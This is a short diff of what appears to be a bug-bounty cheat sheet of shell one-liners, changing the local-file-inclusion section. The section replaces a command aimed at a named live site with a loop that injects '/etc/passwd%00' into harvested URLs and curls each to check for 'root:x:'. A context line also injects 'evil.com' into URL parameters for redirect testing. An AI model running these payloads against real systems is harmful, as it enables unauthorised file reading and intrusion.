@@ -11,11 +11,8 @@ cat * | uro | uniq | grep -a -i "=http" | qsreplace "evil.com" | while read -r h
 ```
 ### LFI
 ```bash
-echo "https://staff.edmarker.com/index.php?page=111&f_id=735&target=Right" | \
-sed 's/111/\/etc\/passwd%00/' | \
-while read url; do \
-    curl -s "$url" | grep "root:x:" && echo "$url is vulnerable"; \
-done
+# echo "https://staff.edmarker.com/index.php?page=111&f_id=735&target=Right" | \
+cat allurls.txt | qsreplace "111" | uro | sort | uniq | sed 's/111/\/etc\/passwd%00/' | while read url; do     curl -s "$url" | grep "root:x:" && echo "$url is vulnerable"; done
 ```
 ### Os Command Injection
 ```
